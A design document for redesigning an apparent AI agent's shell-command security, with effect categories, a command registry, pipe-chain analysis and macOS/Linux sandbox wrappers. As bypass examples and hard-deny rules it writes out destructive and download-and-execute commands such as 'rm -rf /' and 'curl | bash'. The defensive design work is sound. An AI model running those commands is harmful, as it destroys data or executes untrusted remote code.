# Shell Security: Effect Classification + OS Sandbox Redesign

**Date:** 2026-05-03
**Status:** Approved

## Problem

Current shell security uses keyword-based blacklists (`POSIX_DANGEROUS_COMMANDS`, `WINDOWS_DANGEROUS_COMMANDS`, `INLINE_CODE_COMMANDS`) to classify commands. This approach has three core issues:

1. **Easy to bypass**: `/usr/bin/env bash`, `python3 -c "import os; os.system('rm -rf /')"`, `docker run -it ubuntu bash` all evade keyword matching.
2. **High false positive rate**: `chmod +x scripts/build.sh`, `bash scripts/deploy.sh` are common development commands but are DENY or REQUIRE_APPROVAL.
3. **Shell metacharacter blanket policy**: Pipes `|` and redirects `>` are extremely common (e.g., `grep foo bar | wc -l`, `pytest 2>&1`) but all require approval, disrupting workflow.

## Two-Layer Security Architecture

This design introduces two complementary security layers:

| Layer | Mechanism | Purpose |
|-------|-----------|---------|
| **Application Layer** | Effect Classification + Registry | Smart approval decisions — what to allow, approve, or deny based on command semantics |
| **OS Layer** | Sandbox (Seatbelt / Landlock / Windows) | Kernel-level capability restriction — process physically cannot do harm even if application layer is bypassed |

**Key principle**: The two layers complement each other, not replace each other.
- Application layer = UX — knows *whether* the user should be allowed to do something
- OS layer = safety net — ensures process *physically cannot* do things beyond its allowed scope

When sandbox is available, the application layer can relax certain approvals (sandbox provides the safety net).
When sandbox is unavailable, the application layer falls back to full effect classification (no kernel-level guarantees, but still good UX-driven protection).

## Solution: Command Effect Registry (Approach C)

Replace keyword blacklists with an **effect classification system**. Each known command is registered with its effect category. The policy engine looks up the registry to make decisions, analyzing the **overall effect** of the command (including pipe chains) rather than individual command names.

## Effect Categories

```python
class EffectCategory(str, enum.Enum):
    READ_ONLY = "read_only"           # No side effects
    WRITE_PROJECT = "write_project"   # Modifies files/dependencies within project
    WRITE_SYSTEM = "write_system"     # Modifies system state outside project
    DESTRUCTIVE = "destructive"       # Deletes/overwrites files
    ESCALATE = "escalate"             # Privilege escalation
    NETWORK_OUT = "network_out"       # Outbound network requests
    CODE_GEN = "code_gen"             # Inline code execution (cannot statically validate)
    UNKNOWN = "unknown"               # Unrecognized command
```

## Default Action Policy

| Effect Category | Default Action | Examples |
|-----------------|---------------|----------|
| `READ_ONLY` | ALLOW | ls, cat, grep, git log, pwd, which, head, wc, file, find, diff, rg, sort, tail, echo |
| `WRITE_PROJECT` | ALLOW | git add, git commit, npm install, pip install, python script.py, make, cargo build, mkdir, touch, cp, mv |
| `WRITE_SYSTEM` | REQUIRE_APPROVAL | apt-get install, brew install, docker pull, systemctl |
| `DESTRUCTIVE` | REQUIRE_APPROVAL | rm, rmdir, chmod, chown, git reset --hard, git clean |
| `ESCALATE` | DENY | sudo, su, eval, exec |
| `NETWORK_OUT` | REQUIRE_APPROVAL | curl, wget, ssh, scp, rsync |
| `CODE_GEN` | REQUIRE_APPROVAL | python -c, node -e, perl -e, ruby -e, php -r |
| `UNKNOWN` | REQUIRE_APPROVAL | (any command not in registry) |

## CommandEffectEntry

Each command's registry entry:

```python
class CommandEffectEntry(BaseModel):
    category: EffectCategory                          # Base effect category
    allow_subcommands: bool = False                   # Whether subcommands are allowed (e.g., git add, git log)
    subcommand_overrides: dict[str, EffectCategory] = {}  # Subcommand effect overrides
    flag_overrides: dict[str, EffectCategory] = {}        # Specific flag overrides
    platform_overrides: dict[str, EffectCategory] = {}    # Platform-specific overrides (Windows/POSIX)
```

### Subcommand Override Example

`git` base category is `READ_ONLY`, but some subcommands need different treatment:

```python
CommandEffectEntry(
    category=EffectCategory.READ_ONLY,
    allow_subcommands=True,
    subcommand_overrides={
        "add": EffectCategory.WRITE_PROJECT,
        "commit": EffectCategory.WRITE_PROJECT,
        "push": EffectCategory.NETWORK_OUT,
        "reset": EffectCategory.DESTRUCTIVE,
        "clean": EffectCategory.DESTRUCTIVE,
        "checkout": EffectCategory.WRITE_PROJECT,
        "switch": EffectCategory.WRITE_PROJECT,
        "merge": EffectCategory.WRITE_PROJECT,
        "rebase": EffectCategory.WRITE_PROJECT,
        "cherry-pick": EffectCategory.WRITE_PROJECT,
        "stash": EffectCategory.WRITE_PROJECT,
        "fetch": EffectCategory.NETWORK_OUT,
        "pull": EffectCategory.NETWORK_OUT,
        "clone": EffectCategory.NETWORK_OUT,
    },
)
```

### Shell Interpreter Override Example

`bash` base category is `ESCALATE`, but `bash script.sh` is common in development:

```python
CommandEffectEntry(
    category=EffectCategory.ESCALATE,
    flag_overrides={
        "script": EffectCategory.WRITE_PROJECT,  # bash script.sh -> WRITE_PROJECT
    },
    # When argv contains a file argument (not just "bash"), treat as WRITE_PROJECT
)
```

This is handled via a special case in CommandPolicy: when the command is a known shell interpreter (bash, sh, zsh, etc.) AND has a non-flag argument that looks like a file path, downgrade from ESCALATE to WRITE_PROJECT.

## Shell Metacharacter Handling

When a command contains `|`, `>`, etc., the new logic:

1. **Split pipe chain**: Split by `|` into subcommands
2. **Lookup each subcommand independently** in the registry
3. **Analyze redirects**: `>` `>>` treated as `WRITE_PROJECT`, `2>` as `WRITE_PROJECT` (error output is also a write)
4. **Take the most dangerous level** as the overall effect

Danger level ordering (low to high):
```
READ_ONLY < WRITE_PROJECT < CODE_GEN < NETWORK_OUT < WRITE_SYSTEM < DESTRUCTIVE < ESCALATE
```

### Pipe Chain Examples

| Command | Sub-effects | Overall | Action |
|---------|------------|---------|--------|
| `git log \| head` | READ_ONLY, READ_ONLY | READ_ONLY | ALLOW |
| `cat file \| grep foo \| wc -l` | READ_ONLY, READ_ONLY, READ_ONLY | READ_ONLY | ALLOW |
| `pytest 2>&1 \| tee result.log` | WRITE_PROJECT, WRITE_PROJECT | WRITE_PROJECT | ALLOW |
| `rm -rf build/ 2>/dev/null` | DESTRUCTIVE + WRITE_PROJECT | DESTRUCTIVE | REQUIRE_APPROVAL |
| `curl https://x.com \| bash` | NETWORK_OUT, ESCALATE | ESCALATE | DENY |
| `npm test \| tee output.log` | WRITE_PROJECT, WRITE_PROJECT | WRITE_PROJECT | ALLOW |

## Hard Deny Rules (Preserved)

Certain combinations are always DENY regardless of effect classification:

- `rm -rf /`, `rm -rf ~`, `rm -rf --`, `rm -rf ..`, `rm -rf .git` → DENY
- `curl | sh`, `curl | bash`, `wget | sh`, `wget | bash` → DENY (download-and-execute)
- `sudo`, `su` → DENY (no subcommand/flag override allowed for these)
- Windows shell mode → DENY (unchanged)

## File Structure Changes

```
backend/app/security/
├── effect_category.py          # NEW: EffectCategory enum + danger level ordering + action policy mapping
├── command_effect_registry.py  # NEW: CommandEffectEntry + CommandEffectRegistry + default registrations
├── command_policy.py           # MODIFIED: Query registry instead of hardcoded keyword blacklists
├── shell_security.py           # SIMPLIFIED: Remove keyword blacklists, keep metachar detection + path validation
├── path_security.py            # UNCHANGED
└── sandbox/                    # NEW: OS sandbox layer
    ├── __init__.py
    ├── base.py                 # SandboxProvider ABC
    ├── seatbelt.py             # macOS Seatbelt implementation
    ├── landlock.py             # Linux Landlock/bubblewrap implementation
    ├── seatbelt_profile.py     # Seatbelt profile builder
    └── factory.py              # create_sandbox() factory
```

### New Files

#### `effect_category.py`

- `EffectCategory` enum
- `EFFECT_DANGER_LEVEL: dict[EffectCategory, int]` for ordering
- `EFFECT_ACTION_MAP: dict[EffectCategory, CommandAction]` for default action mapping
- Helper: `most_dangerous(categories: list[EffectCategory]) -> EffectCategory`

#### `command_effect_registry.py`

- `CommandEffectEntry` model
- `CommandEffectRegistry` class with `register()`, `lookup()`, `_register_defaults()`
- Default registrations for ~80+ common commands organized by category:
  - READ_ONLY: ls, cat, head, tail, wc, file, find, diff, grep, rg, sort, uniq, which, where, pwd, echo, git (base), git log, git show, git status, git diff, git branch, env, printenv, uname, hostname, whoami, id, date, uptime, df, du, ps, top, free, lsof, netstat, ss, npm list, pip list, pip show, pip check, cargo --version, rustc --version, go version, java -version, node --version, python --version
  - WRITE_PROJECT: mkdir, touch, cp, mv, ln, tar, unzip, git add, git commit, git checkout, git switch, git merge, git rebase, git stash, npm install, npm run, npm test, npm build, pip install, python, python3, node, make, cmake, cargo build, cargo test, cargo run, go build, go test, go run, javac, java, dotnet build, dotnet test, docker build, docker compose, pre-commit
  - WRITE_SYSTEM: apt-get, apt, yum, dnf, brew, pacman, snap, docker pull, docker run, systemctl, service, launchctl
  - DESTRUCTIVE: rm, rmdir, chmod, chown, git reset, git clean, git rm, truncate, shred
  - ESCALATE: sudo, su, eval, exec, bash (base), sh (base), zsh (base), fish (base), ksh (base), csh (base), newgrp, pkexec, gksudo
  - NETWORK_OUT: curl, wget, ssh, scp, rsync, nc, ncat, telnet, ftp, git push, git fetch, git pull, git clone, npm publish, pip download
  - CODE_GEN: python -c, python3 -c, node -e, node --eval, perl -e, ruby -e, php -r
  - Platform-specific (Windows): del, erase, rd, format, diskpart, cmd, powershell, pwsh

### Modified Files

#### `shell_security.py`

**Removed:**
- `POSIX_DANGEROUS_COMMANDS`
- `WINDOWS_DANGEROUS_COMMANDS`
- `INLINE_CODE_COMMANDS`
- Keyword-based rejection in `validate_command()`

**Changed:**
- `validate_command()` no longer raises `ShellSecurityError` on metacharacters — instead returns a flag/marker
- `validate_command()` no longer raises on dangerous command names — only parses and validates paths
- `command_hint` updated to reflect new policy (pipes/redirects allowed for read-only commands, etc.)

**Preserved:**
- `SHELL_META_PATTERN` — still needed to detect metacharacters for execution mode decision
- `shlex.split()` parsing
- `_validate_path_arguments()` — path validation still needed
- `_command_name()` normalization
- `_looks_like_path()` heuristic

#### `command_policy.py`

**Removed:**
- `HARD_DENY_PREFIXES_ARGV` — replaced by registry lookup (ESCALATE → DENY)
- `HARD_DENY_SHELL_COMMANDS` — replaced by registry lookup
- `HIGH_RISK_ARGV_COMMANDS` — replaced by registry lookup (DESTRUCTIVE → REQUIRE_APPROVAL)
- `INLINE_CODE_COMMANDS` — replaced by registry lookup (CODE_GEN → REQUIRE_APPROVAL)

**Added:**
- `CommandEffectRegistry` instance as constructor parameter
- `effect_category` field on `CommandDecision`
- `_classify_argv_command()` — new method that queries registry
- `_classify_shell_command()` — new method that splits pipe chain, queries per subcommand, takes most dangerous
- `_resolve_effect()` — resolves final effect considering subcommand_overrides and flag_overrides
- `_shell_interpreter_override()` — special case: bash/sh/zsh + file arg → WRITE_PROJECT

**Preserved:**
- `HARD_DENY_PATTERNS` — rm -rf / etc still hard-denied
- `HARD_DENY_SHELL_PATTERNS` — curl|sh still hard-denied
- `_capture_environment_snapshot()` — unchanged
- `CommandAction` enum — unchanged
- `CommandDecision` model — add `effect_category` field, rest unchanged
- Overall evaluate() flow: empty check → cwd validation → shell/argv branch → decision

## Backward Compatibility

- `CommandAction` three-tier enum (`ALLOW` / `REQUIRE_APPROVAL` / `DENY`) unchanged
- `CommandDecision` model: new `effect_category` field (optional, defaults to None), rest unchanged
- `ShellTool.execute()` flow unchanged: evaluate → DENY/REQUIRE_APPROVAL/ALLOW
- `ToolApprovalRequest` structure unchanged
- Frontend approval flow unchanged
- `PathSecurity` unchanged
- Existing tests need adaptation (e.g., `bash` from DENY → context-dependent decision)

## Test Adaptations

Key test behavior changes:

| Test Case | Before | After |
|-----------|--------|-------|
| `bash` (no args) | DENY | DENY (ESCALATE base) |
| `bash script.sh` | DENY | WRITE_PROJECT → ALLOW |
| `sh -c "echo hi"` | DENY | CODE_GEN → REQUIRE_APPROVAL |
| `chmod +x script.sh` | REQUIRE_APPROVAL | DESTRUCTIVE → REQUIRE_APPROVAL (same action, different reason) |
| `git log \| head` | REQUIRE_APPROVAL | READ_ONLY → ALLOW |
| `pytest 2>&1 \| tee log` | REQUIRE_APPROVAL | WRITE_PROJECT → ALLOW |
| `curl url \| sh` | DENY | DENY (hard deny rule, same) |
| `pip install foo` | ALLOW | WRITE_PROJECT → ALLOW (same) |
| `npm install` | ALLOW | WRITE_PROJECT → ALLOW (same) |
| `ls` | ALLOW | READ_ONLY → ALLOW (same) |

New test categories to add:
- `TestEffectClassification` — verify registry lookups
- `TestPipeChainClassification` — verify pipe chain effect aggregation
- `TestSubcommandOverrides` — verify git subcommand handling
- `TestShellInterpreterOverride` — verify bash script.sh allowance
- `TestUnknownCommandHandling` — verify UNKNOWN → REQUIRE_APPROVAL
- `TestSandboxDowngrade` — verify approval downgrade when sandbox is active
- `TestSandboxFallback` — verify fallback to full effect classification when sandbox unavailable

## OS Sandbox Layer

### Architecture: Base Class + Platform Implementations

```
backend/app/security/
├── sandbox/
│   ├── __init__.py
│   ├── base.py              # SandboxProvider base class
│   ├── seatbelt.py          # macOS: sandbox-exec / Seatbelt
│   ├── landlock.py          # Linux: Landlock + seccomp / bubblewrap
│   ├── seatbelt_profile.py  # macOS Seatbelt policy template builder
│   └── factory.py           # Auto-select implementation based on platform
```

### SandboxProvider Base Class

```python
from abc import ABC, abstractmethod

class SandboxProvider(ABC):
    """OS sandbox provider base class — all platforms implement the same interface"""

    @abstractmethod
    def is_available(self) -> bool:
        """Whether the current platform supports this sandbox mechanism"""

    @abstractmethod
    def wrap_command(
        self,
        argv: list[str],
        *,
        cwd: str,
        allowed_paths: list[str],    # Read-write directories (project dirs)
        read_only_paths: list[str],  # Read-only directories (system paths)
        allow_network: bool = False, # Whether network access is permitted
        allow_ipc: bool = False,     # Whether IPC is permitted
    ) -> list[str]:
        """Wrap an argv command for sandboxed execution, returns wrapped argv"""

    @abstractmethod
    def wrap_shell_command(
        self,
        command: str,
        *,
        cwd: str,
        allowed_paths: list[str],
        read_only_paths: list[str],
        allow_network: bool = False,
        allow_ipc: bool = False,
    ) -> str:
        """Wrap a shell command string for sandboxed execution, returns wrapped command"""
```

### Platform Implementations

#### macOS: Seatbelt (`sandbox-exec`)

macOS ships with `sandbox-exec` which applies Seatbelt profiles to processes:

```python
class SeatbeltSandbox(SandboxProvider):
    """macOS sandbox using Seatbelt (sandbox-exec)"""

    def is_available(self) -> bool:
        # Check macOS platform and sandbox-exec binary exists
        return sys.platform == "darwin" and os.path.exists("/usr/bin/sandbox-exec")

    def wrap_command(self, argv, *, cwd, allowed_paths, read_only_paths,
                     allow_network=False, allow_ipc=False) -> list[str]:
        profile = self._build_profile(
            allowed_paths=allowed_paths,
            read_only_paths=read_only_paths,
            allow_network=allow_network,
        )
        # sandbox-exec -p <profile> -- <command>
        return ["/usr/bin/sandbox-exec", "-p", profile, "--"] + argv

    def wrap_shell_command(self, command, *, cwd, allowed_paths, read_only_paths,
                           allow_network=False, allow_ipc=False) -> str:
        profile = self._build_profile(
            allowed_paths=allowed_paths,
            read_only_paths=read_only_paths,
            allow_network=allow_network,
        )
        # Escaping handled by shlex.quote
        return f"/usr/bin/sandbox-exec -p {shlex.quote(profile)} -- {command}"

    def _build_profile(self, allowed_paths, read_only_paths, allow_network) -> str:
        """Build Seatbelt profile string"""
        lines = ['(version 1)', '(deny default)']

        # Allow reading standard system paths
        for p in ['/usr', '/bin', '/sbin', '/lib', '/System', '/dev']:
            lines.append(f'(allow file-read* (subpath "{p}"))')

        # Allow read-write for project directories
        for p in allowed_paths:
            lines.append(f'(allow file-read* file-write* (subpath "{p}"))')

        # Allow read-only for specified paths
        for p in read_only_paths:
            lines.append(f'(allow file-read* (subpath "{p}"))')

        # Allow process execution (for running commands)
        lines.append('(allow process-exec (subpath "/usr"))')
        lines.append('(allow process-exec (subpath "/bin"))')
        lines.append('(allow process-exec (subpath "/sbin"))')

        # Network
        if allow_network:
            lines.append('(allow network*)')
        else:
            lines.append('(deny network*)')

        # Allow signal, sysctl for normal process operation
        lines.append('(allow signal)')
        lines.append('(allow sysctl-read)')

        return '\n'.join(lines)
```

#### Linux: Landlock + bubblewrap

Linux uses two complementary mechanisms:

- **Landlock LSM**: Filesystem access control (kernel >= 5.13)
- **bubblewrap (bwrap)**: Lightweight namespace isolation (user namespaces, no Docker needed)
- **seccomp-bpf**: System call filtering (optional, for additional hardening)

```python
class LandlockSandbox(SandboxProvider):
    """Linux sandbox using Landlock + bubblewrap"""

    def is_available(self) -> bool:
        # Check Linux platform + bwrap binary + Landlock kernel support
        if sys.platform != "linux":
            return False
        if not shutil.which("bwrap"):
            return False
        # Check Landlock support via kernel version or /sys/kernel/security/landlock
        return self._check_landlock_support()

    def wrap_command(self, argv, *, cwd, allowed_paths, read_only_paths,
                     allow_network=False, allow_ipc=False) -> list[str]:
        bwrap_args = self._build_bwrap_args(
            allowed_paths=allowed_paths,
            read_only_paths=read_only_paths,
            allow_network=allow_network,
            cwd=cwd,
        )
        # bwrap ... -- <command>
        return ["bwrap"] + bwrap_args + ["--"] + argv

    def wrap_shell_command(self, command, *, cwd, allowed_paths, read_only_paths,
                           allow_network=False, allow_ipc=False) -> str:
        bwrap_args = self._build_bwrap_args(
            allowed_paths=allowed_paths,
            read_only_paths=read_only_paths,
            allow_network=allow_network,
            cwd=cwd,
        )
        args_str = " ".join(shlex.quote(a) for a in bwrap_args)
        return f"bwrap {args_str} -- {command}"

    def _build_bwrap_args(self, allowed_paths, read_only_paths,
                          allow_network, cwd) -> list[str]:
        args = [
            "--unshare-all",           # Unshare all namespaces
            "--die-with-parent",       # Kill sandbox when parent dies
        ]

        if not allow_network:
            args.append("--unshare-net")

        # Mount project directories as read-write
        for p in allowed_paths:
            args.extend(["--bind", p, p])

        # Mount read-only paths
        for p in read_only_paths:
            args.extend(["--ro-bind", p, p])

        # Standard system paths read-only
        for p in ["/usr", "/bin", "/sbin", "/lib", "/lib64", "/etc/alternatives"]:
            if os.path.exists(p):
                args.extend(["--ro-bind", p, p])

        # /proc and /dev needed for basic operation
        args.extend(["--proc", "/proc"])
        args.extend(["--dev", "/dev"])
        args.extend(["--bind", "/tmp", "/tmp"])  # /tmp for temp files

        # Set working directory
        args.extend(["--chdir", cwd])

        return args

    def _check_landlock_support(self) -> bool:
        # Landlock is optional enhancement; bwrap alone provides good isolation
        # Check if we can at least use bwrap
        try:
            result = subprocess.run(
                ["bwrap", "--ro-bind", "/", "/", "--", "true"],
                capture_output=True, timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False
```

#### Windows: Future Iteration

Windows sandbox support is lower priority. Options for future implementation:
- **Job Object + restricted token**: Limit process privileges
- **AppContainer**: Modern Windows sandboxing mechanism
- **Windows Sandbox**: VM-based isolation (heavier)

```python
class WindowsSandbox(SandboxProvider):
    """Windows sandbox — placeholder for future implementation"""

    def is_available(self) -> bool:
        return False  # Not yet implemented

    def wrap_command(self, argv, **kwargs) -> list[str]:
        return argv  # Passthrough until implemented

    def wrap_shell_command(self, command, **kwargs) -> str:
        return command  # Passthrough until implemented
```

### SandboxFactory

```python
def create_sandbox() -> SandboxProvider:
    """Auto-select sandbox implementation based on current platform"""
    providers = [SeatbeltSandbox(), LandlockSandbox(), WindowsSandbox()]
    for provider in providers:
        if provider.is_available():
            logger.info("Sandbox provider selected: %s", provider.__class__.__name__)
            return provider
    logger.warning("No sandbox provider available, falling back to application-layer-only security")
    return NullSandbox()

class NullSandbox(SandboxProvider):
    """No-op sandbox for environments without sandbox support"""

    def is_available(self) -> bool:
        return False

    def wrap_command(self, argv, **kwargs) -> list[str]:
        return argv  # No wrapping

    def wrap_shell_command(self, command, **kwargs) -> str:
        return command  # No wrapping
```

### Sandbox Effect on Approval Policy

When sandbox is active, certain `REQUIRE_APPROVAL` categories can be downgraded:

```python
# In CommandPolicy
def _maybe_downgrade_with_sandbox(self, category: EffectCategory) -> CommandAction:
    """Sandbox-available approval downgrade rules"""
    DOWNGRADE_MAP = {
        EffectCategory.WRITE_SYSTEM: CommandAction.REQUIRE_APPROVAL,  # Still needs approval (system-wide impact)
        EffectCategory.DESTRUCTIVE: CommandAction.ALLOW,              # Sandbox confines damage to project dir
        EffectCategory.NETWORK_OUT: CommandAction.REQUIRE_APPROVAL,   # Still needs approval (data exfil risk)
        EffectCategory.CODE_GEN: CommandAction.ALLOW,                 # Sandbox provides safety net
        EffectCategory.UNKNOWN: CommandAction.REQUIRE_APPROVAL,       # Unknown commands still need approval
    }
    return DOWNGRADE_MAP.get(category, CommandAction.REQUIRE_APPROVAL)
```

### Combined Security Flow

```
Command Input
  │
  ├─ Hard deny check (rm -rf /, curl | sh, sudo) → DENY
  │
  ├─ Effect classification → effect_category
  │
  ├─ Sandbox available?
  │   ├─ YES → Apply downgrade rules → determine action
  │   │        └─ If ALLOW/REQUIRE_APPROVAL → sandbox.wrap_command() → execute in sandbox
  │   └─ NO  → Use full effect classification policy → determine action
  │            └─ Execute directly (no sandbox wrapping)
  │
  └─ Execute (sandboxed or bare)
```

### Updated File Structure

```
backend/app/security/
├── effect_category.py          # NEW: EffectCategory enum + danger level ordering + action policy mapping
├── command_effect_registry.py  # NEW: CommandEffectEntry + CommandEffectRegistry + default registrations
├── command_policy.py           # MODIFIED: Query registry, sandbox-aware approval downgrade
├── shell_security.py           # SIMPLIFIED: Remove keyword blacklists, keep metachar detection + path validation
├── path_security.py            # UNCHANGED
└── sandbox/                    # NEW: OS sandbox layer
    ├── __init__.py
    ├── base.py                 # SandboxProvider ABC
    ├── seatbelt.py             # macOS Seatbelt implementation
    ├── landlock.py             # Linux Landlock/bubblewrap implementation
    ├── seatbelt_profile.py     # Seatbelt profile builder
    └── factory.py              # create_sandbox() factory
```

### ShellTool Integration

`ShellTool` needs minor changes to use sandbox wrapping:

```python
class ShellTool(BaseTool):
    def __init__(self, security, path_security, sandbox=None):
        self.security = security
        self.path_security = path_security
        self.sandbox = sandbox or NullSandbox()
        self.policy = CommandPolicy(security, path_security, self.sandbox)

    async def _execute_argv(self, argv, cwd, timeout):
        # Wrap command in sandbox if available
        if self.sandbox.is_available():
            argv = self.sandbox.wrap_command(
                argv,
                cwd=cwd,
                allowed_paths=self.path_security.allowed_base_paths,
                read_only_paths=["/usr", "/bin", "/sbin", "/lib"],
            )
        # ... rest of execution unchanged

    async def _execute_shell(self, command, cwd, timeout):
        # Wrap shell command in sandbox if available
        if self.sandbox.is_available():
            command = self.sandbox.wrap_shell_command(
                command,
                cwd=cwd,
                allowed_paths=self.path_security.allowed_base_paths,
                read_only_paths=["/usr", "/bin", "/sbin", "/lib"],
            )
        # ... rest of execution unchanged
```

`allow_network` is derived from the command's effect classification:
- `NETWORK_OUT` commands approved by user → `allow_network=True`
- All other commands → `allow_network=False`
